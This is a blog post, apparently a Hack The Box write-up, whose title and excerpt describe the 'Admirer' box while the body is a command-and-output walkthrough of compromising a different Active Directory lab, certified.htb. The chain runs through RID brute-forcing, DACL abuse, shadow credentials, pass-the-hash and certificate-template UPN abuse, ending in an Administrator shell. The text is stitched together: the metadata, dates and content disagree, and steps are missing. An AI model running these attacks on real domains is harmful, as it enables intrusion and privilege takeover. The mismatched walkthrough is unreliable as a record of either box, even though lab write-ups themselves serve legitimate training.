---
layout: single
title: Admirer - Hack The Box
excerpt: "Admirer is an easy box with the typical 'gobuster/find creds on the webserver' part, but after we use a Rogue MySQL server to read files from the server file system, then for privesc there's a cool sudo trick with environment variables so we can hijack the python library path and get RCE as root."
date: 2020-09-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-certified/portada.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - plaintext creds
  - gobuster
  - ftp
  - rogue mysql
  - python
  - sudo
  - setenv  
---

![](/assets/images/htb-writeup-certified/portada.png)

Admirer is an easy box with the typical 'gobuster/find creds on the webserver' part, but after we use a Rogue MySQL server to read files from the server file system, then for privesc there's a cool sudo trick with environment variables so we can hijack the python library path and get RCE as root.

## Portscan

```
   1   │ sudo nmap -p- --open --min-rate 5000 -vvv -Pn 10.10.11.41
   2   │ Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may b
       │ e slower.
   3   │ Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 22:25 UTC
   4   │ Initiating Parallel DNS resolution of 1 host. at 22:25
   5   │ Completed Parallel DNS resolution of 1 host. at 22:25, 0.02s elapsed
   6   │ DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR
       │ : 1, CN: 0]
   7   │ Initiating SYN Stealth Scan at 22:25
   8   │ Scanning 10.10.11.41 [65535 ports]
   9   │ Discovered open port 139/tcp on 10.10.11.41
  10   │ Discovered open port 445/tcp on 10.10.11.41
  11   │ Discovered open port 135/tcp on 10.10.11.41
  12   │ Discovered open port 53/tcp on 10.10.11.41
  13   │ Discovered open port 88/tcp on 10.10.11.41
  14   │ Discovered open port 49666/tcp on 10.10.11.41
  15   │ Discovered open port 593/tcp on 10.10.11.41
  16   │ Discovered open port 5985/tcp on 10.10.11.41
  17   │ Discovered open port 3269/tcp on 10.10.11.41
  18   │ Discovered open port 49673/tcp on 10.10.11.41
  19   │ Discovered open port 464/tcp on 10.10.11.41
  20   │ Discovered open port 49716/tcp on 10.10.11.41
  21   │ SYN Stealth Scan Timing: About 45.96% done; ETC: 22:26 (0:00:36 remaining)
  22   │ Discovered open port 49740/tcp on 10.10.11.41
  23   │ Discovered open port 49683/tcp on 10.10.11.41
  24   │ Discovered open port 55259/tcp on 10.10.11.41
  25   │ Discovered open port 49668/tcp on 10.10.11.41
  26   │ Increasing send delay for 10.10.11.41 from 0 to 5 due to max_successful_tryno increas
       │ e to 4
  27   │ Discovered open port 389/tcp on 10.10.11.41
  28   │ Discovered open port 9389/tcp on 10.10.11.41
  29   │ Discovered open port 636/tcp on 10.10.11.41
  30   │ Discovered open port 3268/tcp on 10.10.11.41
  31   │ Completed SYN Stealth Scan at 22:26, 80.23s elapsed (65535 total ports)
  32   │ Nmap scan report for 10.10.11.41
  33   │ Host is up, received user-set (0.35s latency).
  34   │ Scanned at 2025-02-02 22:25:10 UTC for 81s
  35   │ Not shown: 65515 filtered tcp ports (no-response)
  36   │ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
  37   │ PORT      STATE SERVICE          REASON
  38   │ 53/tcp    open  domain           syn-ack ttl 127
  39   │ 88/tcp    open  kerberos-sec     syn-ack ttl 127
  40   │ 135/tcp   open  msrpc            syn-ack ttl 127
  41   │ 139/tcp   open  netbios-ssn      syn-ack ttl 127
  42   │ 389/tcp   open  ldap             syn-ack ttl 127
  43   │ 445/tcp   open  microsoft-ds     syn-ack ttl 127
  44   │ 464/tcp   open  kpasswd5         syn-ack ttl 127
  45   │ 593/tcp   open  http-rpc-epmap   syn-ack ttl 127
  46   │ 636/tcp   open  ldapssl          syn-ack ttl 127
  47   │ 3268/tcp  open  globalcatLDAP    syn-ack ttl 127
  48   │ 3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
  49   │ 5985/tcp  open  wsman            syn-ack ttl 127
  50   │ 9389/tcp  open  adws             syn-ack ttl 127
  51   │ 49666/tcp open  unknown          syn-ack ttl 127
  52   │ 49668/tcp open  unknown          syn-ack ttl 127
  53   │ 49673/tcp open  unknown          syn-ack ttl 127
  54   │ 49683/tcp open  unknown          syn-ack ttl 127
  55   │ 49716/tcp open  unknown          syn-ack ttl 127
  56   │ 49740/tcp open  unknown          syn-ack ttl 127
  57   │ 55259/tcp open  unknown          syn-ack ttl 127
  58   │ 
  59   │ Read data files from: /usr/share/nmap
  60   │ Nmap done: 1 IP address (1 host up) scanned in 80.43 seconds
  61   │            Raw packets sent: 393178 (17.300MB) | Rcvd: 131 (5.740KB)
  62   │                                                                                      
       │                                           
  63   │ ┌──(noesholk㉿noes)-[~]
  64   │ └─$ sudo nmap -p- --open --min-rate 5000 -vvv -Pn 10.10.11.41
  65   │                                                                                      
       │                                           
  66   │ ┌──(noesholk㉿noes)-[~]
  67   │ └─$ sudo nmap -p22,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,496
       │ 73,49683,49716,49740,55259 --open -sCV 10.10.11.41
  68   │ Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 22:30 UTC
  69   │ Nmap scan report for 10.10.11.41
  70   │ Host is up (0.13s latency).
  71   │ Not shown: 1 filtered tcp port (no-response)
  72   │ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
  73   │ PORT      STATE SERVICE       VERSION
  74   │ 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-03 05:
       │ 30:36Z)
  75   │ 135/tcp   open  msrpc         Microsoft Windows RPC
  76   │ 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  77   │ 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certif
       │ ied.htb0., Site: Default-First-Site-Name)
  78   │ | ssl-cert: Subject: commonName=DC01.certified.htb
  79   │ | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.
       │ certified.htb
  80   │ | Not valid before: 2024-05-13T15:49:36
  81   │ |_Not valid after:  2025-05-13T15:49:36
  82   │ |_ssl-date: 2025-02-03T05:32:09+00:00; +7h00m02s from scanner time.
  83   │ 445/tcp   open  microsoft-ds?
  84   │ 464/tcp   open  kpasswd5?
  85   │ 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  86   │ 636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certif
       │ ied.htb0., Site: Default-First-Site-Name)
  87   │ |_ssl-date: 2025-02-03T05:32:09+00:00; +7h00m03s from scanner time.
  88   │ | ssl-cert: Subject: commonName=DC01.certified.htb
  89   │ | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.
       │ certified.htb
  90   │ | Not valid before: 2024-05-13T15:49:36
  91   │ |_Not valid after:  2025-05-13T15:49:36
  92   │ 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certif
       │ ied.htb0., Site: Default-First-Site-Name)
  93   │ |_ssl-date: 2025-02-03T05:32:11+00:00; +7h00m03s from scanner time.
  94   │ | ssl-cert: Subject: commonName=DC01.certified.htb
  95   │ | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.
       │ certified.htb
  96   │ | Not valid before: 2024-05-13T15:49:36
  97   │ |_Not valid after:  2025-05-13T15:49:36
  98   │ 3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certif
       │ ied.htb0., Site: Default-First-Site-Name)
  99   │ | ssl-cert: Subject: commonName=DC01.certified.htb
 100   │ | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.
       │ certified.htb
 101   │ | Not valid before: 2024-05-13T15:49:36
 102   │ |_Not valid after:  2025-05-13T15:49:36
 103   │ |_ssl-date: 2025-02-03T05:32:09+00:00; +7h00m03s from scanner time.
 104   │ 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 105   │ |_http-title: Not Found
 106   │ 9389/tcp  open  mc-nmf        .NET Message Framing
 107   │ 49666/tcp open  msrpc         Microsoft Windows RPC
 108   │ 49668/tcp open  msrpc         Microsoft Windows RPC
 109   │ 49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 110   │ 49683/tcp open  msrpc         Microsoft Windows RPC
 111   │ 49716/tcp open  msrpc         Microsoft Windows RPC
 112   │ 49740/tcp open  msrpc         Microsoft Windows RPC
 113   │ 55259/tcp open  msrpc         Microsoft Windows RPC
 114   │ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 115   │ 
 116   │ Host script results:
 117   │ | smb2-time: 
 118   │ |   date: 2025-02-03T05:31:32
 119   │ |_  start_date: N/A
 120   │ | smb2-security-mode: 
 121   │ |   3:1:1: 
 122   │ |_    Message signing enabled and required
 123   │ |_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
 124   │ 
 125   │ Service detection performed. Please report any incorrect results at https://nmap.org/
       │ submit/ .
 126   │ Nmap done: 1 IP address (1 host up) scanned in 104.52 seconds
```
ya veo que sera por smb un monitoreo con smbmap o smbclient y crackmapexec y ai tendremos pistas

## smbmap

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ smbmap -H 10.10.11.41 -u 'judith.mader' -p 'judith09'                            
       │   
   3   │ 
   4   │     ________  ___      ___  _______   ___      ___       __         _______
   5   │    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
   6   │   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   7   │    \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
   8   │     __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   9   │    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  10   │   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
  11   │ -----------------------------------------------------------------------------
  12   │ SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
  13   │                      https://github.com/ShawnDEvans/smbmap
  14   │ 
  15   │ [\] Checking for open ports...                                                       
       │                                            [|] Checking for open ports...            
       │                                                                                      
       │  [/] Checking for open ports...                                                      
       │                                             [-] Checking for open ports...           
       │                                                                                      
       │   [*] Detected 1 hosts serving SMB
  16   │ [*] Established 1 SMB connections(s) and 1 authenticated session(s)                  
       │                                     
  17   │                                                                                      
       │                                         
  18   │ [+] IP: 10.10.11.41:445 Name: 10.10.11.41               Status: Authenticated
  19   │         Disk                                                    Permissions     Comme
       │ nt
  20   │         ----                                                    -----------     -----
       │ --
  21   │         ADMIN$                                                  NO ACCESS       Remot
       │ e Admin
  22   │         C$                                                      NO ACCESS       Defau
       │ lt share
  23   │         IPC$                                                    READ ONLY       Remot
       │ e IPC
  24   │         NETLOGON                                                READ ONLY       Logon
       │  server share 
  25   │         SYSVOL                                                  READ ONLY       Logon
       │  server share 
  26   │ [*] Closed 1 connections                                                             
       │                                         
  27   │                                                                                      
       │                                            
  28   │ ┌──(noesholk㉿noes)-[~]
  29   │ └─$ smbmap -H 10.10.11.41 -u 'judith.mader' -p 'judith09' -r NETLOGON
  30   │ 
  31   │     ________  ___      ___  _______   ___      ___       __         _______
  32   │    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  33   │   (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
  34   │    \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
  35   │     __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
  36   │    /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  37   │   (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
  38   │ -----------------------------------------------------------------------------
  39   │ SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
  40   │                      https://github.com/ShawnDEvans/smbmap
  41   │ 
  42   │ [\] Checking for open ports...                                                       
       │                                            [|] Checking for open ports...            
       │                                                                                      
       │  [/] Checking for open ports...                                                      
       │                                             [*] Detected 1 hosts serving SMB
  43   │ [*] Established 1 SMB connections(s) and 1 authenticated session(s)                  
       │                                         
  44   │                                                                                      
       │                                         
  45   │ [+] IP: 10.10.11.41:445 Name: 10.10.11.41               Status: Authenticated
  46   │         Disk                                                    Permissions     Comme
       │ nt
  47   │         ----                                                    -----------     -----
       │ --
  48   │         ADMIN$                                                  NO ACCESS       Remot
       │ e Admin
  49   │         C$                                                      NO ACCESS       Defau
       │ lt share
  50   │         IPC$                                                    READ ONLY       Remot
       │ e IPC
  51   │         NETLOGON                                                READ ONLY       Logon
       │  server share 
  52   │         ./NETLOGON
  53   │         dr--r--r--                0 Mon May 13 15:02:21 2024    .
  54   │         dr--r--r--                0 Mon May 13 15:02:21 2024    ..
  55   │         SYSVOL                                                  READ ONLY       Logon
       │  server share 
  56   │ [*] Closed 1 connections                                                             
       │                                         
  57   │                                                                                      
       │                                            
  58   │ ┌──(noesholk㉿noes)-[~]
  59   │ └─$ smbmap -H 10.10.11.41 -u 'judith.mader' -p 'judith09' -r NETLOGON
```
pues parece algo complicado pero no olvidemos que no solo smb existe y no se si ya vieron kerberos-sec

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ crackmapexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09' --rid-brute | grep 'SidTypeUser'
   3   │ SMB                      10.10.11.41     445    DC01             500: CERTIFIED\Administrator (SidTypeUser)
   4   │ SMB                      10.10.11.41     445    DC01             501: CERTIFIED\Guest (SidTypeUser)
   5   │ SMB                      10.10.11.41     445    DC01             502: CERTIFIED\krbtgt (SidTypeUser)
   6   │ SMB                      10.10.11.41     445    DC01             1000: CERTIFIED\DC01$ (SidTypeUser)
   7   │ SMB                      10.10.11.41     445    DC01             1103: CERTIFIED\judith.mader (SidTypeUser)
   8   │ SMB                      10.10.11.41     445    DC01             1105: CERTIFIED\management_svc (SidTypeUser)
   9   │ SMB                      10.10.11.41     445    DC01             1106: CERTIFIED\ca_operator (SidTypeUser)
  10   │ SMB                      10.10.11.41     445    DC01             1601: CERTIFIED\alexander.huges (SidTypeUser)
  11   │ SMB                      10.10.11.41     445    DC01             1602: CERTIFIED\harry.wilson (SidTypeUser)
  12   │ SMB                      10.10.11.41     445    DC01             1603: CERTIFIED\gregory.cameron (SidTypeUser)
```

```
┌──(noes㉿noes)-[~kali/Descarga]

└─# impacket-dacledit  -action 'write' -rights 'WriteMembers' -target-dn "CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB" -principal "judith.mader" "certified.htb/judith.mader:judith09"


Impacket v0.12.0 - Copyright Fortra

[*] DACL backed up to dacledit-20241206-205730.bak
[*] DACL modified successfully!
```

```
┌──(noes㉿noes)-[[~kali/Descarga]

└─# bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"


[+] judith.mader added to Management
```

```
┌──(noes㉿noes)-[/home/kali/Descarga]

└─# python pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target management_svc --action add


[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 7ba66598-d473-200b-e335-73693201fe6a
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: oigNgAOY.pfx
[*] Must be used with password: F7ddKVbzqkaPtLgqVxFX
```

```
┌──(noes㉿noes)-[/home/kali/Descarga]

└─# python gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/oigNgAOY.pfx -pfx-pass F7ddKVbzqkaPtLgqVxFX certified.htb/management_svc hhh.ccache
2024-12-07 18:59:06,443 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-12-07 18:59:06,456 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-12-07 18:59:28,228 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-12-07 18:59:28,228 minikerberos INFO     07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6
INFO:minikerberos:07229e48b98f6800f3c17aaef3a49815c7b1fff0881969a3756856366a8a87f6
2024-12-07 18:59:28,230 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```
## evil-winrm

```
┌──(noes㉿noes)-[/home/kali/Descarga]
└─# evil-winrm -i certified.htb -u management_svc -H "a091c1832bc***************"
Evil-WinRM shell
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                         
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents>
```

```
┌──(noes㉿noes)-[/home/kali/Descarga]
└─# pth-net rpc password "ca_operator" "123456" -U "certified.htb"/"management_svc"%"a091c1832bcdd4677c28b5a6a1295584":"a091c1832bcdd4677c28b5a6a1295584"  -S "DC01.certified.htb"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```


```
┌──(root㉿kali)-[/home/kali/Certified]
└─# certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

 
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Saved BloodHound data to '20241208202644_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20241208202644_Certipy.txt'
[*] Saved JSON output to '20241208202644_Certipy.json'
```

```
─(noes㉿noes)-[/home/kali/Descarga]
─# certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
[*] Updating user 'ca_operator':
userPrincipalName  : Administrator
[*] Successfully updated 'ca_operator'
```

```
┌──(noes㉿noes)-[/home/kali/Descarga]
└─# evil-winrm -i certified.htb -u administrator -H "0d5b49608bbce1751f708748f67e2d34" 

Evil-WinRM shell
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
```
